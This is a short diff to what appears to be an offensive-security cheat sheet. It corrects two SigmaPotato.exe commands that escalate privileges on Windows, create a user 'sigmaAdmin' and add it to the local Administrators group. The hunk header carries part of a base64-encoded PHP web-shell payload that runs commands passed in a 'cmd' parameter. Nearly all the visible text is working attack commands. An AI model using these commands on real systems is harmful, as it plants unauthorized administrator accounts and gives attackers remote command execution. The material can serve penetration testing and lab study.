@@ -930,8 +930,8 @@ NobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"`
     ```
   - 🖥️ **SigmaPotato.exe**  
     ```
-    .\SigmaPotato "net user sigmaAdmin lab /add
-    .\SigmaPotato "net localgroup Administrators sigmaAdmin /add"
+    .\SigmaPotato.exe "net user sigmaAdmin lab /add"
+    .\SigmaPotato.exe "net localgroup Administrators sigmaAdmin /add"
     ```
   
 | Exploit       | Works On                           | Privilege Required              | Command Example                                                                 |
